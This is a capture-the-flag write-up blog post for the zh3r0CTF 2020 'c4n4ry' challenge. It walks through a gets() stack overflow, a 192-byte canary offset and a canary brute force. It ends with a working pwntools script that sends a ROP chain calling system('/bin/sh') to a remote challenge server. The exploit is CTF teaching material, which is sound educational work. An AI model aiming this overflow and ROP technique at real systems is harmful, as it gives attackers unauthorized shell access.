---
title: "c4n4ry"
event: zh3r0CTF 2020
points: 991
date: 2020-03-06
difficulty: easy
tags: ["canary", "zh3r0"]
---

I am proud to say that my team zh3r0 hosted its first CTF. This blog covers a challenge called c4n4ry, which might have something to do with the stack canary.

# Challenge description:
![](/images/zh3r0_canary/imcanary.png)

# Solution:
## First step:

Analyze the binary and then check its mitigations.

![](/images/zh3r0_canary/mitigationscanary.png)

* NX is enabled so no shellcodes.
* PIE is disabled and also ASLR was disabled so no worries of the address changing.
Now, let us run the binary and then see !!

![](/images/zh3r0_canary/run.png)

We can say that there was a continuous loop running. Also if we analyze the binary carefully we can see the `name` and `input` were not vulnerable but the `description` was using gets which reads arbitrary input.Now we can disassemble the main file now.

![](/images/zh3r0_canary/get.png)

* GETS is vulnerable but…
* There is an additional memory compare.
* We can say that it might be our canary.

## The idea for the exploit:
Our first step will be in calculating the offset for the canary. I use pwntools pwn cyclic function but you guys can do anything.

## Inside GDB:
* I set a break at the memory compare.
* I use pwntools to analyze what is being compared with what
* Note: I also set up a fake canary to work with the binary locally

![](/images/zh3r0_canary/break.png)
<br />
![](/images/zh3r0_canary/break2.png)

Then I analyzed the string that was being compared with the help of pwntools.<br>
I got the offset as 192 for the canary. Now let me make a script to get a shell.
```python
from pwn import *
'''
system address = 0x400780
'''
p = remote("134.209.157.250", 5084)
p.sendline("1")
p.sendline("1")
buf = ('a'*192)
buf += ('abcd')
```

So I set the canary to be “abcd” and then I searched for some ROP and before that, I also got the offset for the ret to be 20 bytes.
So I created a **ROP chain.**

![](/images/zh3r0_canary/c1.png)
now it's just combining all of the gadgets that's it.

## Final step:
I need to brute force the canary. It was damn easy cause i told them the hints that the canary was going to be small letters and was going to be in order.
```python
from pwn import *
'''
sys = 0x400780
'''
for i in range(80, 123):
 p = remote("134.209.157.250",5084)
 p.sendline("1")
 p.sendline("1")
 buf = ('a'*192)
 buf += chr(i)+chr(i+1)+chr(i+2)+chr(i+3)
 buf += ('a'*20)
 buf += (p64(0x400936)) # pop r12
 buf += ("/bin/sh;")
 buf += (p64(0x400933)) #  pop r11 
 buf += (p64(0x6020B0)) #  just a random address to write to 
 buf += (p64(0x400927)) #  mov [r11], r12
 buf += (p64(0x0000000000400939)) # pop rdi
 buf += (p64(0x6020B0)) #  write address
 buf += (p64(0x400780)) #  system
 p.sendline(buf)
 p.interactive()
```
I just made the loop a bit big but what is the problem :P
![](/images/zh3r0_canary/shell.png)

## Conclusion
This was my first attempt to make a canary problem. So hope you liked this. Will be posting more blogs soon.